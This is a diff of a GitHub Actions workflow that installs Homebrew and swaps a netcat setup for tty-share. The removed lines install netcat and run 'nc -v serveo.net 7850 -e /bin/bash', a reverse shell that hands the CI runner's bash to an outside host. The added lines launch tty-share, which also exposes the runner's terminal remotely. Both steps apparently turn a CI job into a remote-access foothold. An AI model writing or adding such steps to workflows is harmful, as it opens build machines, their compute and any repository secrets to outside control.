@@ -28,14 +28,12 @@ jobs:
       # Runs a single command using the runners shell
       - name: Setup brew
         run: /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
-      - name: Installing Netcat
+      - name: Installing tty-share and setup
         run: | 
-          brew install netcat
-          nc --help
+          brew install tty-share
+          tty-share
         
-      - name: Setting the NetCat Remote Shell
-        run: |
-            nc -v serveo.net 7850 -e /bin/bash
+
           
 
           
